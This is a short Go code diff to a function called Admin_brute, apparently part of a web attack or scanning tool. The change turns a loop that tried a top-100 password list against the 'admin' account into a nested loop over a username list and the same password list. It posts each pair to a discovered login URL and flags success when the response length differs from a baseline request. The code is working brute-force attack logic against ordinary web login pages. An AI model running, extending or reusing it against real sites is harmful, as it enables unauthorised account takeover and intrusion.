@@ -95,13 +95,14 @@ func Admin_brute(url string) (username string, password string, loginurl string)
 	usernamekey, passwordkey, loginurl := getinput(url)
 	if loginurl != "" {
 		if req, err := httpRequset(loginurl, "POST", fmt.Sprintf("%s=admin&%s=7756ee93d3ac8037bf4d55744b93e08c", usernamekey, passwordkey)); err == nil {
-			for passi := range top100pass {
-				if req2, err2 := httpRequset(loginurl, "POST", fmt.Sprintf("%s=admin&%s=%s", usernamekey, passwordkey, top100pass[passi])); err2 == nil {
-					if req2.ContentLength != req.ContentLength {
-						fmt.Println()
-						fmt.Printf("admin-brute-sucess|admin:%s--%s", top100pass[passi], loginurl)
-						fmt.Println()
-						return "admin", top100pass[passi], loginurl
+			for useri := range usernames {
+				for passi := range top100pass {
+					if req2, err2 := httpRequset(loginurl, "POST", fmt.Sprintf("%s=%s&%s=%s", usernamekey, usernames[useri], passwordkey, top100pass[passi])); err2 == nil {
+						if req2.ContentLength != req.ContentLength {
+							fmt.Printf("admin-brute-sucess|%s:%s--%s", usernames[useri], top100pass[passi], loginurl)
+							fmt.Println()
+							return usernames[useri], top100pass[passi], loginurl
+						}
 					}
 				}
 			}
